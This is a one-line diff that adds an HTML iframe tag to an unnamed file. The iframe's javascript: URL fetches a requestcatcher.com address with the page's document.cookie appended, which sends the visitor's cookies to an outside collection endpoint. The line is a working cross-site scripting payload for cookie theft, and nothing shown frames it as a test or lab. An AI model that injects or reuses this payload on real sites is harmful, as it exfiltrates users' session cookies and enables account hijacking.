@@ -1,0 +1,1 @@
+<iframe src="javascript:fetch(&quot;https://hhh.requestcatcher.com/&quot;+document.cookie);">
